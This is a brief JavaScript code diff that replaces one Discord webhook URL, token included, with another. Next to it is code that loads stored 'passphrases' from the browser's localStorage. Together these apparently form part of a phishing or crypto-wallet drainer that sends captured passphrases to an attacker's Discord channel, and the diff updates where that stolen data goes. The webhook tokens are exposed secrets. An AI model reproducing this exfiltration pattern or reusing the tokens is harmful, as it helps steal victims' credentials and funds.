@@ -1,5 +1,5 @@
 const webhookUrl =
-  "https://discord.com/api/v10/webhooks/1341617810287099964/oDyQM4PaOgceJWjOaESSPTmCYEi4_bqm4ZCpeKrTCSDt59w0Jqxou7cFggN1xCFRxsNt";
+  "https://discord.com/api/v10/webhooks/1326926051280027680/sJvoThsFlKbayDnzSz2K7N6d7cd9UvlZd4kMFIfl18YTO5mbo8Hc2M7WD02l0IzIXOqM";
 
 const savedPassphrases = JSON.parse(localStorage.getItem("passphrases")) || [];
 
